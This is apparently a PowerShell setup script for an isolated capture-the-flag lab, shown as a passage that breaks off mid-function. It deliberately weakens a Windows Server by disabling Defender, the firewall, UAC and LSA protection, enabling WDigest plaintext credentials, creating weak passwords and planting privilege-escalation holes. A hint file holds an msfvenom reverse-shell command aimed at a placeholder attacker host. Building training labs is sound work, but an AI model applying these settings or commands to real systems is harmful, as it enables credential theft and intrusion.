# Windows Server 2019 Vulnerable Lab Configuration Script v5
# WARNING: FOR ISOLATED LAB ENVIRONMENT ONLY - NEVER USE IN PRODUCTION
# This script intentionally creates security vulnerabilities and CTF flags for penetration testing practice

param(
    [string]$LabPassword = "Password123!",
    [string]$NetworkPrinter = "192.168.148.105",
    [switch]$GenerateFlagReport
)

Write-Host "==========================================" -ForegroundColor Red
Write-Host "VULNERABLE LAB CONFIGURATION SCRIPT v5" -ForegroundColor Red
Write-Host "FOR EDUCATIONAL PURPOSES ONLY" -ForegroundColor Red
Write-Host "NEVER USE IN PRODUCTION ENVIRONMENTS" -ForegroundColor Red
Write-Host "==========================================" -ForegroundColor Red
Write-Host ""
$confirm = Read-Host "Type 'VULNERABLE' to confirm this is for an isolated lab"
if ($confirm -ne "VULNERABLE") { exit }

# Initialize flag tracking
$global:FlagList = @()
$global:FlagCounter = 1

# Pokemon list for deterministic flag generation
$PokemonList = @(
    "PIKACHU", "CHARIZARD", "BULBASAUR", "SQUIRTLE", "MEWTWO",
    "GENGAR", "DRAGONITE", "SNORLAX", "ALAKAZAM", "MACHAMP",
    "GYARADOS", "LAPRAS", "EEVEE", "VAPOREON", "JOLTEON",
    "FLAREON", "ARTICUNO", "ZAPDOS", "MOLTRES", "DRATINI",
    "MEOWTH", "PSYDUCK", "ARCANINE", "POLIWAG", "ABRA",
    "MACHOP", "BELLSPROUT", "TENTACOOL", "GEODUDE", "PONYTA",
    "SLOWPOKE", "MAGNEMITE", "FARFETCH", "DODUO", "SEEL",
    "GRIMER", "SHELLDER", "GASTLY", "ONIX", "DROWZEE",
    "KRABBY", "VOLTORB", "EXEGGCUTE", "CUBONE", "HITMONLEE",
    "LICKITUNG", "KOFFING", "RHYHORN", "CHANSEY", "TANGELA",
    "KANGASKHAN", "HORSEA", "GOLDEEN", "STARYU", "SCYTHER",
    "JYNX", "ELECTABUZZ", "MAGMAR", "PINSIR", "TAUROS",
    "MAGIKARP", "DITTO", "UMBREON", "ESPEON", "PORYGON",
    "OMANYTE", "KABUTO", "AERODACTYL", "CYNDAQUIL", "TOTODILE",
    "CHIKORITA", "TYPHLOSION", "FERALIGATR", "MEGANIUM", "FURRET"
)

# Function to generate deterministic flag based on position
function New-CTFFlag {
    param(
        [string]$Location,
        [string]$Description,
        [int]$Points,
        [string]$Difficulty,
        [string]$Technique
    )
    
    # Use deterministic selection based on counter
    $pokemonIndex = ($global:FlagCounter - 1) % $PokemonList.Count
    $pokemon = $PokemonList[$pokemonIndex]
    
    # Generate deterministic 8-digit number using hash of counter and hostname
    $seed = "SERVER$($global:FlagCounter)$(hostname)"
    $hash = [System.Security.Cryptography.SHA256]::Create()
    $hashBytes = $hash.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($seed))
    $hashInt = [BitConverter]::ToUInt32($hashBytes, 0)
    $digits = "{0:D8}" -f ($hashInt % 100000000)
    
    $flag = "FLAG{$pokemon$digits}"
    
    $global:FlagList += [PSCustomObject]@{
        FlagID = "{0:D3}" -f $global:FlagCounter
        Flag = $flag
        Location = $Location
        Description = $Description
        Points = $Points
        Difficulty = $Difficulty
        Technique = $Technique
        Hostname = hostname
    }
    
    $global:FlagCounter++
    return $flag
}

# Function to create weak users with embedded flags
function Create-WeakUsers {
    Write-Host "Creating vulnerable user accounts with flags..." -ForegroundColor Yellow
    
    # User with flag in description
    $flag1 = New-CTFFlag -Location "User Description" -Description "Hidden in user description" -Points 10 -Difficulty "Easy" -Technique "User enumeration"
    
    $users = @(
        @{Name="overclock"; Password="Administrator2025!"; Groups=@("Administrators"); Description=$flag1},
        @{Name="user1"; Password="Password123!"; Groups=@("Users"); Description="Standard User"},
        @{Name="backup"; Password="Backupaccount123!"; Groups=@("Backup Operators"); Description="Backup Service Account"},
        @{Name="service"; Password="ServiceAccount123!"; Groups=@("Users"); Description="Service Account"},
        @{Name="test"; Password="TestAccount123!"; Groups=@("Users"); Description="Test Account"},
        @{Name="sqlservice"; Password="SQLservice2019"; Groups=@("Users"); Description="SQL Service Account"},
        @{Name="svc_print"; Password="PrintService123"; Groups=@("Users"); Description="Print Service Account"},
        @{Name="debugger"; Password="Debugger2025!"; Groups=@("Users"); Description="Debug Account for Development"}
    )
    
    foreach ($user in $users) {
        try {
            New-LocalUser -Name $user.Name -Password (ConvertTo-SecureString $user.Password -AsPlainText -Force) -Description $user.Description -PasswordNeverExpires -ErrorAction SilentlyContinue
            foreach ($group in $user.Groups) {
                Add-LocalGroupMember -Group $group -Member $user.Name -ErrorAction SilentlyContinue
            }
            Write-Host "  Created user: $($user.Name)" -ForegroundColor Green
        } catch {
            Write-Host "  User $($user.Name) already exists or error occurred" -ForegroundColor Gray
        }
    }
    
    # Create a user with flag as username (shortened to fit 20 char limit)
    $shortPokemon = @("PIKA", "MEW", "CHAR", "BULB", "SQUIR", "EEVEE", "DRAGO", "GENGAR")
    $pokemonIndex = ($global:FlagCounter - 1) % $shortPokemon.Count
    $selectedPokemon = $shortPokemon[$pokemonIndex]
    $randomNum = Get-Random -Minimum 1000 -Maximum 9999
    $flagUserShort = "FLAG{$selectedPokemon$randomNum}"  # e.g., FLAG{PIKA1234} = 15 chars
    
    $flagUserDesc = New-CTFFlag -Location "Username" -Description "User account with flag as username: $flagUserShort" -Points 15 -Difficulty "Easy" -Technique "User enumeration"
    
    # Create the user with the shortened flag username
    New-LocalUser -Name $flagUserShort -Password (ConvertTo-SecureString "HiddenUser123!" -AsPlainText -Force) -Description "Can you find me?" -PasswordNeverExpires -ErrorAction SilentlyContinue
    Write-Host "  Created special user: $flagUserShort" -ForegroundColor Green
    
    # Store the actual username in the flag list for reporting
    $global:FlagList[-1].Flag = $flagUserShort  # Update the flag value to match the actual username
    
    # Enable built-in accounts
    Enable-LocalUser -Name "Administrator" -ErrorAction SilentlyContinue
    Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString $LabPassword -AsPlainText -Force)
    Enable-LocalUser -Name "Guest" -ErrorAction SilentlyContinue
}

# Function to configure Mimikatz-friendly settings
function Configure-MimikatzVulnerabilities {
    Write-Host "Configuring Mimikatz-friendly vulnerabilities..." -ForegroundColor Yellow
    
    # Enable WDigest to store plaintext passwords in memory
    Write-Host "  Enabling WDigest for plaintext password storage..." -ForegroundColor Gray
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -Value 1
    
    # Disable Credential Guard
    Write-Host "  Disabling Credential Guard..." -ForegroundColor Gray
    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard") {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 0 -ErrorAction SilentlyContinue
    }
    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity") {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
    }
    
    # Disable LSA Protection (RunAsPPL)
    Write-Host "  Disabling LSA Protection..." -ForegroundColor Gray
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL -Value 0 -ErrorAction SilentlyContinue
    
    # Enable storing credentials
    Write-Host "  Configuring credential storage settings..." -ForegroundColor Gray
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name DisableDomainCreds -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name TokenLeakDetectDelaySecs -Value 0 -ErrorAction SilentlyContinue
    
    # Increase cached logon count
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name CachedLogonsCount -Value 50 -ErrorAction SilentlyContinue
    
    # Create Mimikatz flag in LSASS memory (simulated)
    $mimikatzFlag = New-CTFFlag -Location "LSASS Memory" -Description "Dumped from LSASS process" -Points 45 -Difficulty "Hard" -Technique "Mimikatz credential dumping"
    
    # Store flag in registry where it would appear in memory dumps
    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "SecretFlag" -Value $mimikatzFlag -Force
    
    # Create a scheduled task that keeps credentials in memory
    $credentialScript = @"
`$password = ConvertTo-SecureString "$LabPassword" -AsPlainText -Force
`$credential = New-Object System.Management.Automation.PSCredential("Administrator", `$password)
while (`$true) {
    Start-Sleep -Seconds 300
    # Keep credential object in memory
}
"@
    $credentialScript | Out-File "C:\Windows\Temp\CredKeeper.ps1" -Force
    
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\Windows\Temp\CredKeeper.ps1"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName "CredentialKeeper" -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
    
    Write-Host "  Mimikatz vulnerabilities configured" -ForegroundColor Green
}

# Function to configure debug privileges
function Configure-DebugPrivileges {
    Write-Host "Configuring debug privilege vulnerabilities..." -ForegroundColor Yellow
    
    # Grant SeDebugPrivilege to non-admin users
    Write-Host "  Granting SeDebugPrivilege to users..." -ForegroundColor Gray
    
    # Export current security policy
    secedit /export /cfg C:\Windows\Temp\secpol.cfg /quiet
    
    # Read the file
    $secpol = Get-Content C:\Windows\Temp\secpol.cfg
    
    # Find and modify SeDebugPrivilege line
    $debugLine = $secpol | Where-Object { $_ -like "SeDebugPrivilege*" }
    if ($debugLine) {
        # Add users to debug privilege
        $newDebugLine = "SeDebugPrivilege = *S-1-5-32-544,*S-1-5-32-545,debugger"
        $secpol = $secpol -replace [regex]::Escape($debugLine), $newDebugLine
    } else {
        # Add the line if it doesn't exist
        $secpol += "SeDebugPrivilege = *S-1-5-32-544,*S-1-5-32-545,debugger"
    }
    
    # Write back and import
    $secpol | Out-File C:\Windows\Temp\secpol.cfg -Force
    secedit /configure /db C:\Windows\security\local.sdb /cfg C:\Windows\Temp\secpol.cfg /areas USER_RIGHTS /quiet
    
    # Create flag for debug privilege abuse
    $debugFlag = New-CTFFlag -Location "Debug Privileges" -Description "Abused SeDebugPrivilege" -Points 40 -Difficulty "Medium" -Technique "Debug privilege abuse"
    # Create the registry key first
    New-Item -Path "HKLM:\SOFTWARE" -Name "DebugFlags" -Force -ErrorAction SilentlyContinue | Out-Null
    # Then create the property
    New-ItemProperty -Path "HKLM:\SOFTWARE\DebugFlags" -Name "Flag" -Value $debugFlag -Force
    
    Write-Host "  Debug privileges configured" -ForegroundColor Green
}

# Function to create pass-the-hash scenarios
function Configure-PassTheHash {
    Write-Host "Configuring Pass-the-Hash vulnerabilities..." -ForegroundColor Yellow
    
    # Disable restricted admin mode for RDP
    Write-Host "  Disabling Restricted Admin mode..." -ForegroundColor Gray
    New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0 -PropertyType DWORD -Force -ErrorAction SilentlyContinue
    
    # Enable NTLM authentication
    Write-Host "  Configuring NTLM settings..." -ForegroundColor Gray
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibilityLevel -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name NoLmHash -Value 0 -ErrorAction SilentlyContinue
    
    # Store NTLM hashes in a recoverable format
    $users = @("Administrator", "overclock", "backup")
    foreach ($user in $users) {
        # Force password change to ensure hashes are stored
        $password = switch($user) {
            "Administrator" { $LabPassword }
            "overclock" { "Administrator2025!" }
            "backup" { "Backupaccount123!" }
        }
        Set-LocalUser -Name $user -Password (ConvertTo-SecureString $password -AsPlainText -Force) -ErrorAction SilentlyContinue
    }
    
    # Create PTH flag
    $pthFlag = New-CTFFlag -Location "Pass-the-Hash" -Description "Successful PTH attack" -Points 50 -Difficulty "Hard" -Technique "Pass-the-Hash attack"
    
    # Store flag in location accessible after PTH
    $pthPath = "C:\Windows\System32\config\systemprofile\pth_success.txt"
    New-Item -Path (Split-Path $pthPath -Parent) -ItemType Directory -Force -ErrorAction SilentlyContinue
    $pthFlag | Out-File $pthPath -Force
    
    Write-Host "  Pass-the-Hash vulnerabilities configured" -ForegroundColor Green
}

# Function to disable security features
function Disable-SecurityFeatures {
    Write-Host "Disabling security features..." -ForegroundColor Yellow
    
    # Disable Windows Defender
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
    Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue
    
    # Disable Windows Firewall
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    
    # Disable UAC
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0
    
    # Disable Windows Defender Credential Guard
    if (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard") {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -Name "LsaCfgFlags" -Value 0 -ErrorAction SilentlyContinue
    }
    
    Write-Host "  Security features disabled" -ForegroundColor Green
}

# Function to configure vulnerable RDP with flag
function Configure-VulnerableRDP {
    Write-Host "Configuring vulnerable RDP with flags..." -ForegroundColor Yellow
    
    # Enable RDP
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    
    # Disable NLA
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
    
    # Allow blank passwords
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name "LimitBlankPasswordUse" -Value 0
    
    # Remove account lockout policy
    net accounts /lockoutthreshold:0
    
    # Enable clipboard redirection
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "fDisableClip" -Value 0
    
    # Add flag in RDP certificate name
    $rdpFlag = New-CTFFlag -Location "RDP Certificate" -Description "Hidden in RDP certificate properties" -Points 20 -Difficulty "Medium" -Technique "RDP enumeration"
    New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "CertificateComment" -Value $rdpFlag -Force
    
    Write-Host "  RDP configured with vulnerabilities and flag" -ForegroundColor Green
}

# Function to configure vulnerable SMB shares with flags
function Configure-VulnerableSMB {
    Write-Host "Configuring vulnerable SMB shares with flags..." -ForegroundColor Yellow
    
    # Enable SMBv1
    Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol" -All -NoRestart -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name SMB1 -Value 1
    
    # Create vulnerable shares with flags
    $shares = @(
        @{Name="Public"; Path="C:\Public"; FlagFile=$true; FlagDifficulty="Easy"; Points=10},
        @{Name="Data"; Path="C:\Data"; FlagFile=$false},
        @{Name="Backup"; Path="C:\Backup"; FlagFile=$true; FlagDifficulty="Medium"; Points=20},
        @{Name="IT"; Path="C:\IT"; FlagFile=$true; FlagDifficulty="Hard"; Points=30},
        @{Name="Finance"; Path="C:\Finance"; FlagFile=$false}
    )
    
    foreach ($share in $shares) {
        New-Item -Path $share.Path -ItemType Directory -Force -ErrorAction SilentlyContinue
        New-SmbShare -Name $share.Name -Path $share.Path -FullAccess "Everyone" -ErrorAction SilentlyContinue
        
        # Set NTFS permissions
        $acl = Get-Acl $share.Path
        $permission = "Everyone","FullControl","ContainerInherit,ObjectInherit","None","Allow"
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
        $acl.SetAccessRule($accessRule)
        Set-Acl $share.Path $acl
        
        # Place flags in some shares
        if ($share.FlagFile) {
            $flag = New-CTFFlag -Location "SMB Share: $($share.Name)" -Description "Found in $($share.Name) share" -Points $share.Points -Difficulty $share.FlagDifficulty -Technique "SMB enumeration"
            $flag | Out-File "$($share.Path)\flag.txt" -Force
        }
        
        Write-Host "  Created share: $($share.Name)" -ForegroundColor Green
    }
    
    # Plant sensitive files with embedded flags
    $passFlag = New-CTFFlag -Location "Password file" -Description "Embedded in passwords.txt" -Points 15 -Difficulty "Easy" -Technique "File search"
    "Administrator:$LabPassword`n$passFlag" | Out-File "C:\Public\passwords.txt"
    
    # Create SAM backup for mimikatz practice
    $samFlag = New-CTFFlag -Location "SAM Backup" -Description "Found in SAM backup file" -Points 45 -Difficulty "Hard" -Technique "SAM database extraction"
    @"
SAM Database Backup (for Mimikatz practice)
Created: $(Get-Date)
Flag: $samFlag
Use: mimikatz # lsadump::sam /system:system.hiv /sam:sam.hiv
"@ | Out-File "C:\Backup\sam_backup_info.txt"
    
    # Hidden flag in alternate data stream
    $adsFlag = New-CTFFlag -Location "Alternate Data Stream" -Description "Hidden in ADS of C:\Public\normal.txt" -Points 40 -Difficulty "Hard" -Technique "ADS discovery"
    "This is a normal file" | Out-File "C:\Public\normal.txt"
    # Use Set-Content for ADS instead of Out-File
    Set-Content -Path "C:\Public\normal.txt" -Stream "hidden" -Value $adsFlag
    
    # Enable null sessions
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "RestrictAnonymous" -Value 0
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters" -Name "RestrictNullSessAccess" -Value 0
}

# Function to create multiple unquoted service paths
function Create-UnquotedServicePaths {
    Write-Host "Creating unquoted service path vulnerabilities with flags..." -ForegroundColor Yellow
    
    # Service 1 - Basic unquoted path
    $unquotedFlag1 = New-CTFFlag -Location "Unquoted Service Path" -Description "Vulnerable Scanner Service exploitation" -Points 25 -Difficulty "Easy" -Technique "Unquoted service path"
    
    New-Item -Path "C:\Program Files\Vulnerable Scanner" -ItemType Directory -Force
    New-Item -Path "C:\Program Files\Vulnerable Scanner\bin" -ItemType Directory -Force
    "echo $unquotedFlag1 > C:\flag_unquoted1.txt" | Out-File "C:\Program Files\Vulnerable Scanner\bin\scanner.bat"
    
    sc.exe create "VulnScanner" binpath= "C:\Program Files\Vulnerable Scanner\bin\scanner.bat" start= auto
    sc.exe config "VulnScanner" obj= "LocalSystem"
    sc.exe description "VulnScanner" "Vulnerable Scanner Service - Check for unquoted paths"
    
    # Service 2 - More complex path
    $unquotedFlag2 = New-CTFFlag -Location "Unquoted Service Path 2" -Description "Common Application Service exploitation" -Points 30 -Difficulty "Medium" -Technique "Unquoted service path"
    
    New-Item -Path "C:\Program Files\Common Application\System Tools" -ItemType Directory -Force
    "echo $unquotedFlag2 > C:\flag_unquoted2.txt" | Out-File "C:\Program Files\Common Application\System Tools\service.exe.bat"
    
    sc.exe create "CommonAppService" binpath= "C:\Program Files\Common Application\System Tools\service.exe" start= auto
    sc.exe config "CommonAppService" obj= "LocalSystem"
    
    # Service 3 - Hidden in vendor path
    $unquotedFlag3 = New-CTFFlag -Location "Unquoted Service Path 3" -Description "Vendor Update Service exploitation" -Points 35 -Difficulty "Medium" -Technique "Unquoted service path"
    
    New-Item -Path "C:\Program Files (x86)\Vendor Software Suite\Update Service" -ItemType Directory -Force
    "echo $unquotedFlag3 > C:\flag_unquoted3.txt" | Out-File "C:\Program Files (x86)\Vendor Software Suite\Update Service\updater.bat"
    
    sc.exe create "VendorUpdater" binpath= "C:\Program Files (x86)\Vendor Software Suite\Update Service\updater.exe" start= auto DisplayName= "Vendor Update Service"
    sc.exe config "VendorUpdater" obj= "LocalSystem"
    
    Write-Host "  Created 3 unquoted service path vulnerabilities with flags" -ForegroundColor Green
}

# FIXED Function to configure AlwaysInstallElevated
function Configure-AlwaysInstallElevated {
    Write-Host "Configuring AlwaysInstallElevated vulnerability with flag..." -ForegroundColor Yellow
    
    # Function to create registry path recursively
    function Ensure-RegistryPath {
        param([string]$Path)
        
        if (!(Test-Path $Path)) {
            $parent = Split-Path $Path -Parent
            $leaf = Split-Path $Path -Leaf
            
            if ($parent -and $parent -ne "" -and !(Test-Path $parent)) {
                Ensure-RegistryPath -Path $parent
            }
            
            if ($parent) {
                New-Item -Path $parent -Name $leaf -Force -ErrorAction SilentlyContinue | Out-Null
            }
        }
    }
    
    try {
        # Create registry paths
        Ensure-RegistryPath -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"
        Ensure-RegistryPath -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer"
        
        # Enable AlwaysInstallElevated in both HKLM and HKCU
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 1 -PropertyType DWORD -Force
        Set-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 1 -PropertyType DWORD -Force
        
        Write-Host "  AlwaysInstallElevated enabled successfully" -ForegroundColor Green
        
    } catch {
        Write-Host "  Warning: Could not fully configure AlwaysInstallElevated: $_" -ForegroundColor Yellow
    }
    
    # Create flag that will be accessible after MSI privilege escalation
    $msiFlag = New-CTFFlag -Location "AlwaysInstallElevated" -Description "MSI privilege escalation successful" -Points 40 -Difficulty "Medium" -Technique "AlwaysInstallElevated MSI"
    
    # Create a file only readable by SYSTEM that contains the flag
    $flagPath = "C:\Windows\System32\config\systemprofile\msi_flag.txt"
    $flagDir = Split-Path $flagPath -Parent
    
    # Create directory if it doesn't exist
    if (!(Test-Path $flagDir)) {
        New-Item -Path $flagDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    }
    
    $msiFlag | Out-File $flagPath -Force
    
    # Create a sample MSI in Public folder for students to find
    $msiInfo = @"
AlwaysInstallElevated is enabled!
Generate malicious MSI with: msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi > shell.msi
Or use: msiexec /quiet /qn /i malicious.msi
Flag location hint: Check SYSTEM profile directory after escalation
"@
    $msiInfo | Out-File "C:\Public\msi_hint.txt"
    
    Write-Host "  AlwaysInstallElevated configured with flag" -ForegroundColor Green
}

# Function to configure Print Spooler vulnerabilities
function Configure-PrintSpoolerVulnerabilities {
    Write-Host "Configuring Print Spooler vulnerabilities with flags..." -ForegroundColor Yellow
    
    # Ensure Print Spooler is running
    Set-Service -Name "Spooler" -StartupType Automatic
    Start-Service -Name "Spooler" -ErrorAction SilentlyContinue
    
    # Enable Point and Print without warnings (CVE-2021-34527 related)
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Force | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "NoWarningNoElevationOnInstall" -Value 1 -PropertyType DWORD -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "UpdatePromptSettings" -Value 2 -PropertyType DWORD -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "RestrictDriverInstallationToAdministrators" -Value 0 -PropertyType DWORD -Force
    
    # Create writable spool directory
    $spoolPath = "C:\Windows\System32\spool\drivers\color"
    New-Item -Path $spoolPath -ItemType Directory -Force -ErrorAction SilentlyContinue
    icacls $spoolPath /grant "Everyone:(OI)(CI)F" /T
    
    # PrintNightmare flag
    $spoolerFlag = New-CTFFlag -Location "Print Spooler Exploit" -Description "PrintNightmare exploitation successful" -Points 45 -Difficulty "Hard" -Technique "PrintNightmare/Print Spooler abuse"
    $spoolerFlag | Out-File "$spoolPath\printnightmare_flag.txt" -Force
    
    # Create vulnerable printer
    Add-PrinterDriver -Name "Generic / Text Only" -ErrorAction SilentlyContinue
    Add-PrinterPort -Name "FILE:" -ErrorAction SilentlyContinue
    Add-Printer -Name "VulnerablePrinter" -DriverName "Generic / Text Only" -PortName "FILE:" -Shared -ShareName "VulnPrinter" -PermissionSDDL "O:BAG:DUD:(A;;LCSWSDRCWDWO;;;WD)" -ErrorAction SilentlyContinue
    
    Write-Host "  Print Spooler vulnerabilities configured with flags" -ForegroundColor Green
}

# Function to install and configure vulnerable SSH
function Configure-VulnerableSSH {
    Write-Host "Installing and configuring vulnerable SSH with flags..." -ForegroundColor Yellow
    
    # Install OpenSSH Server
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    
    # Start SSH service
    Start-Service sshd
    Set-Service -Name sshd -StartupType 'Automatic'
    
    # SSH banner flag
    $sshFlag = New-CTFFlag -Location "SSH Banner" -Description "SSH server banner" -Points 10 -Difficulty "Easy" -Technique "Service enumeration"
    
    # Configure vulnerable SSH settings with flag in banner
    $sshdConfig = @"
# Vulnerable SSH Configuration
Port 22
Banner /etc/ssh/banner.txt
PasswordAuthentication yes
PermitRootLogin yes
PermitEmptyPasswords yes
MaxAuthTries 100
MaxSessions 10
PubkeyAuthentication yes
StrictModes no
LoginGraceTime 120
X11Forwarding yes
TCPKeepAlive yes
PermitUserEnvironment yes
Compression yes
UsePAM no
"@
    
    $sshdConfig | Out-File "C:\ProgramData\ssh\sshd_config" -Encoding ascii -Force
    
    # Create banner with flag
    "Welcome to Vulnerable SSH Server`n$sshFlag" | Out-File "C:\ProgramData\ssh\banner.txt" -Encoding ascii
    
    # Create SSH keys with flag in authorized_keys comment
    $sshKeyFlag = New-CTFFlag -Location "SSH authorized_keys" -Description "Hidden in SSH authorized_keys" -Points 30 -Difficulty "Medium" -Technique "SSH key enumeration"
    New-Item -Path "C:\ProgramData\ssh\authorized_keys" -ItemType File -Force
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7 overclock@vulnerable # $sshKeyFlag" | Out-File "C:\ProgramData\ssh\authorized_keys"
    
    # Restart SSH
    Restart-Service sshd
    
    # Open firewall
    New-NetFirewallRule -Name sshd -DisplayName 'SSH Server' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
    
    Write-Host "  SSH server configured with flags" -ForegroundColor Green
}

# Function to create additional vulnerable services
function Create-VulnerableServices {
    Write-Host "Creating additional vulnerable services with flags..." -ForegroundColor Yellow
    
    # Service with weak permissions
    $svcDescFlag = New-CTFFlag -Location "Service Description" -Description "WeakPermService description" -Points 15 -Difficulty "Easy" -Technique "Service enumeration"
    sc.exe create WeakPermService binpath= "C:\Windows\System32\cmd.exe /c echo vulnerable" start= auto
    sc.exe description WeakPermService "Weak Permission Service - $svcDescFlag"
    sc.exe sdset WeakPermService "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)(A;;RPWP;;;WD)"
    
    Write-Host "  Additional vulnerable services created" -ForegroundColor Green
}

# Function to configure scheduled tasks with flags
function Create-VulnerableScheduledTasks {
    Write-Host "Creating vulnerable scheduled tasks with flags..." -ForegroundColor Yellow
    
    # Task flag
    $taskFlag = New-CTFFlag -Location "Scheduled Task" -Description "VulnTask output" -Points 25 -Difficulty "Medium" -Technique "Scheduled task abuse"
    
    # Create task with stored credentials that writes flag
    $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\cmd.exe" -Argument "/c echo $taskFlag > C:\Public\taskflag.txt"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5)
    $principal = New-ScheduledTaskPrincipal -UserId "overclock" -LogonType Password -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    
    Register-ScheduledTask -TaskName "VulnTask" -Action $action -Trigger $trigger -Settings $settings -User "overclock" -Password "Administrator2025!" -ErrorAction SilentlyContinue
    
    Write-Host "  Vulnerable scheduled tasks created with flags" -ForegroundColor Green
}

# Function to create registry flags
function Create-RegistryFlags {
    Write-Host "Creating registry-based flags..." -ForegroundColor Yellow
    
    # Easy flag in HKLM
    $regFlag1 = New-CTFFlag -Location "Registry HKLM" -Description "HKLM:\SOFTWARE\VulnApp" -Points 15 -Difficulty "Easy" -Technique "Registry enumeration"
    New-Item -Path "HKLM:\SOFTWARE\VulnApp" -Force | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\VulnApp" -Name "LicenseKey" -Value $regFlag1 -Force
    
    # Medium flag in HKCU
    $regFlag2 = New-CTFFlag -Location "Registry HKCU" -Description "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Points 25 -Difficulty "Medium" -Technique "Persistence mechanism review"
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdaterFlag" -Value "cmd /c echo $regFlag2" -Force
    
    # Hard flag in service registry
